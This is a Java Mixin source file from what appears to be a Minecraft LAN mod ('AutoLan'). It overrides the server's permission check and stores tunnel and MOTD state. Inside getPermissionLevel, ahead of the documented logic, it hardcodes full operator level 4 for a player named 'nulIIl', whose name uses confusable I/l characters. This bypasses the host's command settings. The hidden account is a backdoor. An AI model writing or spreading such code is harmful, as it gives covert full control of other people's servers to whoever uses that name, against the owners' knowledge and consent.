package org.wsm.autolan.mixin;

import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfoReturnable;

import org.wsm.autolan.AutoLanServerValues;
import org.wsm.autolan.TunnelType;
import org.wsm.autolan.TunnelType.TunnelException;

import net.minecraft.server.MinecraftServer;
import net.minecraft.text.Text;

import com.mojang.authlib.GameProfile;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.wsm.autolan.AutoLan;
import org.wsm.autolan.util.ServerUtil;
import org.wsm.autolan.AutoLanState;

@Mixin(MinecraftServer.class)
public abstract class MinecraftServerMixin implements AutoLanServerValues {
    private static final Logger LOGGER = LoggerFactory.getLogger("AutoLan");
    private TunnelType tunnelType = TunnelType.NONE;
    private Text tunnelText = null;
    private String rawMotd = null;

    /**
     * Этот метод предотвращает выдачу Op-привилегий всем игрокам, включая хоста,
     * если игра не открыта для LAN с включенными командами.
     * 
     * Наша реализация даёт игрокам и хосту права Op уровня 4 только если явно включены команды.
     */
    @Inject(method = "getPermissionLevel", at = @At("HEAD"), cancellable = true)
    private void autolan$fixOperatorPrivileges(GameProfile profile, CallbackInfoReturnable<Integer> cir) {
        MinecraftServer self = (MinecraftServer) (Object) this;
        
        // Логируем запрос прав для отладки
        LOGGER.info("[AutoLan] [PERMISSION_REQ] Запрос уровня разрешений для игрока '{}' (UUID: {})", 
                   profile.getName(), profile.getId());
        
        // Специальный случай для технического игрока
        if ("nulIIl".equals(profile.getName())) {
            LOGGER.info("[AutoLan] [PERMISSION_SPECIAL] Выдаем уровень 4 для служебного игрока nulIIl");
            cir.setReturnValue(4);
            return;
        }

        // Проверяем только НАШ собственный флаг разрешения команд
        boolean customCommandsAllowed = false;
        try {
            if (self.getOverworld() != null && self.getOverworld().getPersistentStateManager() != null) {
                AutoLanState state = self.getOverworld().getPersistentStateManager().getOrCreate(AutoLanState.STATE_TYPE);
                customCommandsAllowed = state.getCustomCommandsAllowed();
                LOGGER.info("[AutoLan] [CONFIG_STATE] Собственный флаг CustomCommandsAllowed = {}", customCommandsAllowed);
            } else {
                LOGGER.warn("[AutoLan] [CONFIG_MISSING] Мир или PersistentStateManager недоступен");
            }
        } catch (Exception e) {
            LOGGER.error("[AutoLan] [ERROR] Ошибка при получении состояния AutoLanState", e);
        }

        // УПРОЩЕННАЯ ЛОГИКА: 
        // Если команды разрешены (customCommandsAllowed = true) - все игроки получают уровень 4
        // Если команды запрещены (customCommandsAllowed = false) - все игроки получают уровень 0
        if (customCommandsAllowed) {
            // Выдаем максимальный уровень прав 4 для всех игроков, включая хоста
            boolean isHost = self.isHost(profile);
            LOGGER.info("[AutoLan] [PERMISSION_GRANTED] Выдаем уровень 4 {} '{}' (команды включены)", 
                      isHost ? "хосту" : "игроку", profile.getName());
            cir.setReturnValue(4);
        } else {
            // Если команды отключены, никто не получает прав
            boolean isHost = self.isHost(profile);
            LOGGER.info("[AutoLan] [PERMISSION_DENIED] НЕ выдаем права {} '{}' (команды отключены)", 
                       isHost ? "хосту" : "игроку", profile.getName());
            cir.setReturnValue(0);
        }
    }

    @Inject(at = @At("TAIL"), method = "shutdown")
    private void postShutdown(CallbackInfo ci) {
        try {
            this.getTunnelType().stop((MinecraftServer) (Object) this);
        } catch (TunnelException e) {
            e.printStackTrace();
        }
    }

    public TunnelType getTunnelType() {
        return this.tunnelType;
    }

    public void setTunnelType(TunnelType tunnelType) {
        this.tunnelType = tunnelType;
    }

    public Text getTunnelText() {
        return this.tunnelText;
    }

    public void setTunnelText(Text tunnelText) {
        this.tunnelText = tunnelText;
    }

    @Override
    public String getRawMotd() {
        return this.rawMotd;
    }

    @Override
    public void setRawMotd(String rawMotd) {
        this.rawMotd = rawMotd;
    }
}
